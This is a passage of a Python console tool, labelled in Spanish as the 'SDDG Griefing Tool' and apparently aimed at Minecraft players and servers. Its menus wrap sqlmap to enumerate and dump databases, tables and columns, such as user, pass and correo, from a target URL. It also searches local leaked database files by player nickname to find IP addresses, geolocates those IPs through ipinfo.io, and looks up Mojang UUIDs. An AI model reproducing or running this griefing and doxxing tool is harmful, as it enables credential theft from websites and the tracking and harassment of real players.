          print(f"  {Fore.LIGHTCYAN_EX}╚════════════════════════════════════╝")
          print("\n")
          menu3=input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] ")
          if menu3=="1":
              os.system("title [SDDG Griefing Tool] Sacar DB")
              sqlvc = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}r {Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}B{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}WEB{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
              os.system(f"sqlmap -u {sqlvc} --dbs || python sqlmap.py -u {sqlvc} --dbs")
              print("\n")
              input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")
          elif menu3=="2":
              os.system("title [SDDG Griefing Tool] Acceder al DB")
              sqlvc1 = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}B{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}V{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}l{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}e{Fore.LIGHTGREEN_EX}r{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}b{Fore.LIGHTRED_EX}i{Fore.LIGHTGREEN_EX}l{Fore.LIGHTRED_EX}i{Fore.LIGHTGREEN_EX}d{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}d{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}WEB{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
              sqltb = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}l{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}i{Fore.LIGHTRED_EX}o{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}L{Fore.LIGHTGREEN_EX}a {Fore.LIGHTRED_EX}B{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}e {Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}e {Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}t{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}s{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Selecionar La DB{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
              os.system(f"sqlmap -u {sqlvc1} -D {sqltb} --tables || python sqlmap.py -u {sqlvc1} -D {sqltb} --tables")
              print("\n")
              input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")
          elif menu3=="3":
              os.system("title [SDDG Griefing Tool] Acceder a las Columnas")
              sql = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}B{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}V{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}l{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}e{Fore.LIGHTGREEN_EX}r{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}b{Fore.LIGHTRED_EX}i{Fore.LIGHTGREEN_EX}l{Fore.LIGHTRED_EX}i{Fore.LIGHTGREEN_EX}d{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}d{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}WEB{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
              sql1 = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}l{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}i{Fore.LIGHTRED_EX}o{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}L{Fore.LIGHTGREEN_EX}a {Fore.LIGHTRED_EX}B{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}e {Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}e {Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}t{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}s{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Selecionar La DB{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
              sql2 = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}l{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}i{Fore.LIGHTRED_EX}o{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}L{Fore.LIGHTGREEN_EX}a {Fore.LIGHTRED_EX}T{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}b{Fore.LIGHTGREEN_EX}l{Fore.LIGHTRED_EX}a{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Selecionar La Tabla{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
              os.system(f"sqlmap -u {sql} -D {sql1} -T {sql2} --columns || python sqlmap.py -u {sql} -D {sql1} -T {sql2} --columns")
              print("\n")
              input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")
          elif menu3=="4":
              os.system("title [SDDG Griefing Tool] Dumpear DB ")
              sql11 = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}B{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}V{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}l{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}e{Fore.LIGHTGREEN_EX}r{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}b{Fore.LIGHTRED_EX}i{Fore.LIGHTGREEN_EX}l{Fore.LIGHTRED_EX}i{Fore.LIGHTGREEN_EX}d{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}d{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}WEB{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
              sql22 = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}l{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}i{Fore.LIGHTRED_EX}o{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}L{Fore.LIGHTGREEN_EX}a {Fore.LIGHTRED_EX}B{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}e {Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}e {Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}t{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}s{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Selecionar La DB{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")  
              sql33 = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}l{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}i{Fore.LIGHTRED_EX}o{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}L{Fore.LIGHTGREEN_EX}a {Fore.LIGHTRED_EX}T{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}b{Fore.LIGHTGREEN_EX}l{Fore.LIGHTRED_EX}a{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Selecionar La Tabla{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}") 
              sql34 = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}l{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}i{Fore.LIGHTRED_EX}o{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}L{Fore.LIGHTGREEN_EX}a {Fore.LIGHTRED_EX}C{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}l{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}m{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}a{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Selecionar La Columna (si quieres escojer varias escribelas juntas ej: user,pass,correo){Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}") 
              os.system(f"sqlmap -u {sql11} -D {sql22} -T {sql33} -C {sql34} --dump || python sqlmap.py -u {sql11} -D {sql22} -T {sql33} -C {sql34} --dump")
              print("\n")
              input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")
          elif menu3=="5":
              print("\n")
              input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")
          else:
              print("\n")
              input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")
      
      elif menu2=="2":
          os.system("title [SDDG Griefing Tool] IPGeolocate")
          ip = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}I{Fore.LIGHTGREEN_EX}P{Fore.LIGHTRED_EX}G{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}o{Fore.LIGHTGREEN_EX}l{Fore.LIGHTRED_EX}o{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}t{Fore.LIGHTRED_EX}e{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}IP{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
          print("\n")
          os.system("curl https://ipinfo.io/" + ip)
          print("\n")
          input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")

      elif menu2=="3":
          os.system("title [SDDG Griefing Tool] Buscar IPs En DB")
          try:
              target = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}B{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}s{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}r {Fore.LIGHTRED_EX}I{Fore.LIGHTGREEN_EX}P{Fore.LIGHTRED_EX}s {Fore.LIGHTGREEN_EX}E{Fore.LIGHTRED_EX}n {Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}B{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}NICK{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
              print("")
              with open("db1.txt") as a:
                  lines = a.readlines()
                  lines = [x.strip() for x in lines]
                  for line in lines:
                      if target in line:
                          print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}"+line)
              with open("provanas.txt") as b:
                  lines = b.readlines()
                  lines = [x.strip() for x in lines]
                  for line in lines:
                      if target in line:
                          print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}"+line)
              with open("db2.txt") as c:
                  lines = c.readlines()
                  lines = [x.strip() for x in lines]
                  for line in lines:
                    if target in line:
                          print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}"+line)
              with open("db3.txt") as f:
                  lines = f.readlines()
                  lines = [x.strip() for x in lines]
                  for line in lines:
                      if target in line:
                          print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}"+line)
              print("\n")
              input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")
          except Exception as e:
                print("\n")
                input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")

      elif menu2=="4":
          os.system("title [SDDG Griefing Tool] Accont Info")
          target = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}A{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}u{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}t {Fore.LIGHTGREEN_EX}I{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}f{Fore.LIGHTRED_EX}o{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}NICK{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
          url = "https://api.mojang.com/users/profiles/minecraft/"
          text123 = requests.get((url)+(target))

          if text123.text == "":
              print("\n")
              print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTBLUE_EX}"+(target))
              print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTBLUE_EX}UUID: *")
              print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTBLUE_EX}Type: No Premium")
              print("\n")
              input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")
          else:
              asmr = (text123.text).split('"')
              uuid = (asmr)[3]
              print("\n")
              print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTBLUE_EX}"+(target))
              print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTBLUE_EX}UUID: "+(uuid))
              print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTBLUE_EX}Type: Premium")
              print("\n")
              input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")

  else:
      print("\n")
      input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu")